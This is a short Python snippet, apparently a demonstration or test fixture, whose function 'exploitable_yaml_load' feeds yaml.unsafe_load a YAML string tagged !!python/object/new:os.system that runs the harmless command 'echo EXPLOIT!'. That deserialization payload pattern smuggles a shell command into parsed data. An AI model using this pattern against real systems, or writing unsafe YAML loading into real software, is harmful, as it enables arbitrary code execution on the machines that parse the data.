import yaml
import os
import json 

def exploitable_yaml_load(**kwargs):
    yaml.unsafe_load("!!python/object/new:os.system [echo EXPLOIT!]", **kwargs)
    print("hello world!")
    print("hello world!")
  
 
